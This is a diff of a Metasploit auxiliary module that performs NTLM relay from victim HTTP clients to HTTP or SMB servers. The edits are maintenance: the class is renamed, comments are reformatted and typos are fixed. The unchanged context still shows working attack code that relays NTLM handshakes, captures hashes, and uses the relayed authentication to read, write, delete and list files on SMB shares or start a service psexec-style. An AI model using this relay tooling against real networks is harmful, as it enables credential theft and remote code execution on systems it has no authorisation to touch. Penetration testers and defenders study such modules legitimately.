@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 require 'rex/proto/ntlm/constants'
 require 'rex/proto/ntlm/message'
@@ -15,8 +13,7 @@ NTLM_CONST = Rex::Proto::NTLM::Constants
 NTLM_CRYPT = Rex::Proto::NTLM::Crypt
 MESSAGE = Rex::Proto::NTLM::Message
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
@@ -67,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
       OptPath.new('SYNCFILE', [false, "Local Ruby file to eval dynamically" ]),
       OptString.new('SYNCID', [false, "ID to identify a request saved to db" ]),
 
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptPath.new('RESPPAGE', [false,
@@ -76,7 +73,7 @@ class Metasploit3 < Msf::Auxiliary
         'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil]),
       OptString.new('SMB_SHARES', [false, 'The shares to check with SMB_ENUM',
               'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'])
-    ], self.class)
+    ])
 
     deregister_options('DOMAIN', 'NTLM::SendLM', 'NTLM::SendSPN', 'NTLM::SendNTLM', 'NTLM::UseLMKey',
       'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')
@@ -144,14 +141,14 @@ class Metasploit3 < Msf::Auxiliary
     cli.send_response(resp)
   end
 
-  #The call to handle_relay should be a victim HTTP type 1 request
+  # The call to handle_relay should be a victim HTTP type 1 request
   def handle_relay(cli_sock, hash)
     print_status("Beginning NTLM Relay...")
     message = Rex::Text.decode_base64(hash)
-    #get type of message, which will be HTTP, SMB, ...
+    # get type of message, which will be HTTP, SMB, ...
     protocol = datastore['RTYPE'].split('_')[0]
     if(message[8,1] != "\x03")
-      #Relay NTLMSSP_NETOTIATE from client to server (type 1)
+      # Relay NTLMSSP_NETOTIATE from client to server (type 1)
       case protocol
         when 'HTTP'
           resp, ser_sock = http_relay_toserver(hash)
@@ -166,10 +163,10 @@ class Metasploit3 < Msf::Auxiliary
         when 'SMB'
           t2hash, ser_sock = smb_relay_toservert1(hash)
       end
-      #goes along with above, resp is now just the hash
+      # goes along with above, resp is now just the hash
       client_respheader = "NTLM " << t2hash
 
-      #Relay NTLMSSP_CHALLENGE from server to client (type 2)
+      # Relay NTLMSSP_CHALLENGE from server to client (type 2)
       response = create_response(401, "Unauthorized")
       response.headers['WWW-Authenticate'] = client_respheader
       response.headers['Proxy-Support'] = 'Session-Based-Authentication'
@@ -179,7 +176,7 @@ class Metasploit3 < Msf::Auxiliary
 
       cli_sock.send_response(response)
 
-      #Get the type 3 hash from the client and relay to the server
+      # Get the type 3 hash from the client and relay to the server
       cli_type3Data = cli_sock.get_once(-1, 5)
       begin
         cli_type3Header = cli_type3Data.split(/\r\nAuthorization:\s+NTLM\s+/,2)[1]
@@ -194,7 +191,7 @@ class Metasploit3 < Msf::Auxiliary
           resp, ser_sock = http_relay_toserver(cli_type3Hash, ser_sock)
         when 'SMB'
           ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)
-          #perform authenticated action
+          # perform authenticated action
           action = datastore['RTYPE'].split('_')[1]
           case action
             when 'GET'
@@ -213,7 +210,7 @@ class Metasploit3 < Msf::Auxiliary
       end
       report_info(resp, cli_type3Hash)
 
-      #close the client socket
+      # close the client socket
       response = set_cli_200resp()
       cli_sock.send_response(response)
       cli_sock.close()
@@ -272,12 +269,12 @@ class Metasploit3 < Msf::Auxiliary
     # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
     if datastore['HTTP_HEADERFILE'] != nil
       print_status("Including extra headers from: #{datastore['HTTP_HEADERFILE']}")
-      #previous request might create the file, so error thrown at runtime
+      # previous request might create the file, so error thrown at runtime
       if not ::File.readable?(datastore['HTTP_HEADERFILE'])
         print_error("HTTP_HEADERFILE unreadable, aborting")
         raise ArgumentError
       end
-      #read file line by line to deal with any dos/unix ending ambiguity
+      # read file line by line to deal with any dos/unix ending ambiguity
       File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
         next if header.strip == ''
         theaders << (header) << "\r\n"
@@ -290,7 +287,7 @@ class Metasploit3 < Msf::Auxiliary
     'version' => '1.1',
     }
     if (@finalputdata != nil)
-      #we need to get rid of an extra "\r\n"
+      # we need to get rid of an extra "\r\n"
       theaders = theaders[0..-3]
       opts['data'] = @finalputdata << "\r\n\r\n"
     end
@@ -304,18 +301,18 @@ class Metasploit3 < Msf::Auxiliary
 
     # Type3 processing
     if type3
-      #check if auth was successful
+      # check if auth was successful
       if resp.code == 401
         print_error("Auth not successful, returned a 401")
       else
-        print_status("Auth successful, saving server response in database")
+        print_good("Auth successful, saving server response in database")
       end
-      vprint_status(resp)
+      vprint_status(resp.to_s)
     end
     return [resp, ser_sock]
   end
 
-  #relay ntlm type1 message for SMB
+  # relay ntlm type1 message for SMB
   def smb_relay_toservert1(hash)
     rsock = Rex::Socket::Tcp.create(
       'PeerHost' => datastore['RHOST'],
@@ -343,7 +340,7 @@ class Metasploit3 < Msf::Auxiliary
     resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob, false)
     resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
 
-    #Save the user_ID for future requests
+    # Save the user_ID for future requests
     ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']
 
     begin
@@ -359,12 +356,12 @@ class Metasploit3 < Msf::Auxiliary
     return [ntlmsspencodedblob, ser_sock]
   end
 
-  #relay ntlm type3 SMB message
+  # relay ntlm type3 SMB message
   def smb_relay_toservert3(hash, ser_sock)
-    #arg = get_hash_info(hash)
+    # arg = get_hash_info(hash)
     dhash = Rex::Text.decode_base64(hash)
 
-    #Create a GSS blob for ntlmssp type 3 message, encoding the passed hash
+    # Create a GSS blob for ntlmssp type 3 message, encoding the passed hash
     blob =
       "\xa1" + Rex::Proto::NTLM::Utils.asn1encode(
         "\x30" + Rex::Proto::NTLM::Utils.asn1encode(
@@ -383,7 +380,7 @@ class Metasploit3 < Msf::Auxiliary
       )
     resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
 
-    #check if auth was successful
+    # check if auth was successful
     if (resp['Payload']['SMB'].v['ErrorClass'] == 0)
       print_status("SMB auth relay succeeded")
     else
@@ -396,7 +393,7 @@ class Metasploit3 < Msf::Auxiliary
     return ser_sock
   end
 
-  #gets a specified file from the drive
+  # gets a specified file from the drive
   def smb_get(ser_sock)
     share, path = datastore['RURIPATH'].split('\\', 2)
     path = path
@@ -411,7 +408,7 @@ class Metasploit3 < Msf::Auxiliary
     return resp["Payload"].v["Payload"]
   end
 
-  #puts a specified file
+  # puts a specified file
   def smb_put(ser_sock)
     share, path = datastore['RURIPATH'].split('\\', 2)
     path = path
@@ -426,7 +423,7 @@ class Metasploit3 < Msf::Auxiliary
     return logdata
   end
 
-  #deletes a file from a share
+  # deletes a file from a share
   def smb_rm(ser_sock)
     share, path = datastore['RURIPATH'].split('\\', 2)
     path = path
@@ -437,8 +434,8 @@ class Metasploit3 < Msf::Auxiliary
     return logdata
   end
 
-  #smb share enumerator, overly simplified, just tries connecting to configured shares
-  #This could be improved by using techniques from SMB_ENUMSHARES
+  # smb share enumerator, overly simplified, just tries connecting to configured shares
+  # This could be improved by using techniques from SMB_ENUMSHARES
   def smb_enum(ser_sock)
     shares = []
     datastore["SMB_SHARES"].split(",").each do |share_name|
@@ -453,7 +450,7 @@ class Metasploit3 < Msf::Auxiliary
     return shares
   end
 
-  #smb list directory
+  # smb list directory
   def smb_ls(ser_sock)
     share, path = datastore['RURIPATH'].split('\\', 2)
     ser_sock.client.tree_connect(share)
@@ -469,11 +466,11 @@ class Metasploit3 < Msf::Auxiliary
     return files
   end
 
-  #start a service. This methos copies a lot of logic/code from psexec (and smb_relay)
+  # start a service. This methos copies a lot of logic/code from psexec (and smb_relay)
   def smb_pwn(ser_sock, cli_sock)
 
-    #filename is a little finicky, it needs to be in a format like
-    #"%SystemRoot%\\system32\\calc.exe" or "\\\\host\\c$\\WINDOWS\\system32\\calc.exe
+    # filename is a little finicky, it needs to be in a format like
+    # "%SystemRoot%\\system32\\calc.exe" or "\\\\host\\c$\\WINDOWS\\system32\\calc.exe
     filename = datastore['RURIPATH']
 
     ser_sock.connect("IPC$")
@@ -593,12 +590,12 @@ class Metasploit3 < Msf::Auxiliary
     ser_sock.disconnect("IPC$")
   end
 
-  #print status, and add to the info database
+  # print status, and add to the info database
   def report_info(resp, type3_hash)
     data = get_hash_info(type3_hash)
 
-    #no need to generically always grab everything, but grab common config options
-    #and the response, some may be set to nil and that's fine
+    # no need to generically always grab everything, but grab common config options
+    # and the response, some may be set to nil and that's fine
     data[:protocol] = datastore['RTYPE']
     data[:RHOST] = datastore['RHOST']
     data[:RPORT] = datastore['RPORT']
@@ -614,9 +611,9 @@ class Metasploit3 < Msf::Auxiliary
     )
   end
 
-  #mostly taken from http_ntlm module handle_auth function
+  # mostly taken from http_ntlm module handle_auth function
   def get_hash_info(type3_hash)
-    #authorization string is base64 encoded message
+    # authorization string is base64 encoded message
     domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(type3_hash)
     nt_len = ntlm_hash.length
 
@@ -629,8 +626,8 @@ class Metasploit3 < Msf::Auxiliary
       if arg[:lm_hash][16,32] == '0' * 32
         arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
       end
-    #if the length of the ntlm response is not 24 then it will be bigger and represent
-    #a ntlmv2 response
+    # if the length of the ntlm response is not 24 then it will be bigger and represent
+    # a ntlmv2 response
     elsif nt_len > 48 #lmv2/ntlmv2
       arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
         :lm_hash          => lm_hash[0, 32],
@@ -641,7 +638,7 @@ class Metasploit3 < Msf::Auxiliary
     elsif nt_len == 0
       print_status("Empty hash from #{host} captured, ignoring ... ")
     else
-      print_status("Unknow hash type from #{host}, ignoring ...")
+      print_status("Unknown hash type from #{host}, ignoring ...")
     end
 
     arg[:host] = host
@@ -651,7 +648,7 @@ class Metasploit3 < Msf::Auxiliary
     return arg
   end
 
-  #function allowing some basic/common configuration in responses
+  # function allowing some basic/common configuration in responses
   def set_cli_200resp()
     response = create_response(200, "OK")
     response.headers['Proxy-Support'] = 'Session-Based-Authentication'
@@ -663,7 +660,7 @@ class Metasploit3 < Msf::Auxiliary
         respfile.close
 
         type = datastore['RESPPAGE'].split('.')[-1].downcase
-        #images can be especially useful (e.g. in email signatures)
+        # images can be especially useful (e.g. in email signatures)
         case type
         when 'png', 'gif', 'jpg', 'jpeg'
           print_status('setting content type to image')
